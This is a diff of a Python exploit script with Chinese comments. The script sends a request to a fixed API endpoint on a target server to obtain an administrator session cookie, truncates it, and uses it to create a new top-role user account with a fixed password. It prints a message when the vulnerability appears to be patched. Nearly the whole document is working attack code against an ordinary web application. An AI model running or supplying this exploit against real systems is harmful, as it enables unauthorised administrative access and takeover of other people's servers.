@@ -14,9 +14,9 @@ def getCookie(host):
         "Accept-Language":"zh-CN,zh;q=0.9",
         "Host":host}
     response = requests.get(url,headers=headers)
-    set_cookies = response.headers['Set-Cookie']
-    setCookie = set_cookies[:43]
-    return setCookie
+    SetCookie = response.headers.get('Set-Cookie')
+    return SetCookie
+# 向固定api接口发送请求以获取管理员cookie，并截取获取到的setcookie字符串前43位（因响应会将Setcookie后的字段一并输出，所以需要截取长度）
 
 
 def addUser(SetCookie,host):
@@ -27,30 +27,33 @@ def addUser(SetCookie,host):
         "Host":host,
         "cookie":SetCookie}
     timeout = 8
-    data = {'account': 'test3',
+    data = {'account': 'test',
             'password': '123456Qa',
             'realname': 'test',
             'role': 'top',
             'group': '1'}
     res = requests.post(weburl,headers=headers,data=data,timeout=timeout)
     return res
+# 将获取的管理员Cookie填入请求，创建用户
 
-def is_empty(a):
-    return not a
 
 def main():
     """主程序"""
     weburl = "192.168.110.144"
     host = str(weburl)
+# weburl参数需自行修改
     SetCookie = getCookie(host)
-    if is_empty(SetCookie):
+    if SetCookie == None:
         print("获取Cookie失败，漏洞可能已被修复。\n")
     else:
-        res1 = addUser(SetCookie,host)
+        set_cookies = SetCookie[:43]
+        res1 = addUser(set_cookies,host)
         if str(res1.status_code) == "400":
+# 状态码为400时表示账号已存在或创建失败
             print("账号可能已存在，请尝试更换用户名。\n")
         else:
             print("账号已生成。")
 
 if __name__ == '__main__':
     main()
+
